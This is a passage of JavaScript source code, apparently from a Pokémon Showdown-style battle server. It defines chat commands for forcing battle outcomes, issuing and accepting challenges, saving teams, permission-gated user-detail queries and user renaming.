			this.sendReply('You can only set the timer from inside a room.');
		}
	},

	forcetie: 'forcewin',
	forcewin: function(target, room, user) {
		if (!this.can('forcewin')) return false;
		if (!room.battle) {
			this.sendReply('/forcewin - This is not a battle room.');
			return false;
		}

		room.battle.endType = 'forced';
		if (!target) {
			room.battle.tie();
			this.logModCommand(user.name+' forced a tie.');
			return false;
		}
		target = Users.get(target);
		if (target) target = target.userid;
		else target = '';

		if (target) {
			room.battle.win(target);
			this.logModCommand(user.name+' forced a win for '+target+'.');
		}

	},

	/*********************************************************
	 * Challenging and searching commands
	 *********************************************************/

	cancelsearch: 'search',
	search: function(target, room, user) {
		if (target) {
			Rooms.global.searchBattle(user, target);
		} else {
			Rooms.global.cancelSearch(user);
		}
	},

	chall: 'challenge',
	challenge: function(target, room, user, connection) {
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.popupReply("The user '"+this.targetUsername+"' was not found.");
		}
		if (targetUser.blockChallenges && !user.can('bypassblocks', targetUser)) {
			return this.popupReply("The user '"+this.targetUsername+"' is not accepting challenges right now.");
		}
		if (!user.prepBattle(target, 'challenge', connection)) return;
		user.makeChallenge(targetUser, target);
	},

	away: 'blockchallenges',
	idle: 'blockchallenges',
	blockchallenges: function(target, room, user) {
		user.blockChallenges = true;
		this.sendReply('You are now blocking all incoming challenge requests.');
	},

	back: 'allowchallenges',
	allowchallenges: function(target, room, user) {
		user.blockChallenges = false;
		this.sendReply('You are available for challenges from now on.');
	},

	cchall: 'cancelChallenge',
	cancelchallenge: function(target, room, user) {
		user.cancelChallengeTo(target);
	},

	accept: function(target, room, user, connection) {
		var userid = toUserid(target);
		var format = '';
		if (user.challengesFrom[userid]) format = user.challengesFrom[userid].format;
		if (!format) {
			this.popupReply(target+" cancelled their challenge before you could accept it.");
			return false;
		}
		if (!user.prepBattle(format, 'challenge', connection)) return;
		user.acceptChallengeFrom(userid);
	},

	reject: function(target, room, user) {
		user.rejectChallengeFrom(toUserid(target));
	},

	saveteam: 'useteam',
	utm: 'useteam',
	useteam: function(target, room, user) {
		try {
			user.team = JSON.parse(target);
		} catch (e) {
			this.popupReply('Not a valid team.');
		}
	},

	/*********************************************************
	 * Low-level
	 *********************************************************/

	cmd: 'query',
	query: function(target, room, user, connection) {
		var spaceIndex = target.indexOf(' ');
		var cmd = target;
		if (spaceIndex > 0) {
			cmd = target.substr(0, spaceIndex);
			target = target.substr(spaceIndex+1);
		} else {
			target = '';
		}
		if (cmd === 'userdetails') {

			var targetUser = Users.get(target);
			if (!targetUser) {
				connection.send('|queryresponse|userdetails|'+JSON.stringify({
					userid: toId(target),
					rooms: false
				}));
				return false;
			}
			var roomList = {};
			for (var i in targetUser.roomCount) {
				if (i==='global') continue;
				var targetRoom = Rooms.get(i);
				if (!targetRoom || targetRoom.isPrivate) continue;
				var roomData = {};
				if (targetRoom.battle) {
					var battle = targetRoom.battle;
					roomData.p1 = battle.p1?' '+battle.p1:'';
					roomData.p2 = battle.p2?' '+battle.p2:'';
				}
				roomList[i] = roomData;
			}
			if (!targetUser.roomCount['global']) roomList = false;
			var userdetails = {
				userid: targetUser.userid,
				avatar: targetUser.avatar,
				rooms: roomList
			};
			if (user.can('ip', targetUser)) {
				var ips = Object.keys(targetUser.ips);
				if (ips.length === 1) {
					userdetails.ip = ips[0];
				} else {
					userdetails.ips = ips;
				}
			}
			connection.send('|queryresponse|userdetails|'+JSON.stringify(userdetails));

		} else if (cmd === 'roomlist') {

			connection.send('|queryresponse|roomlist|'+JSON.stringify({
				rooms: Rooms.global.getRoomList(true)
			}));

		} else if (cmd === 'rooms') {

			connection.send('|queryresponse|rooms|'+JSON.stringify(
				Rooms.global.getRooms()
			));

		}
	},

	trn: function(target, room, user, connection) {
		var commaIndex = target.indexOf(',');
		var targetName = target;
		var targetAuth = false;
		var targetToken = '';
		if (commaIndex >= 0) {
			targetName = target.substr(0,commaIndex);
			target = target.substr(commaIndex+1);
			commaIndex = target.indexOf(',');
			targetAuth = target;
			if (commaIndex >= 0) {
				targetAuth = !!parseInt(target.substr(0,commaIndex),10);
				targetToken = target.substr(commaIndex+1);
			}
		}
		user.rename(targetName, targetToken, targetAuth, connection);
	},

};
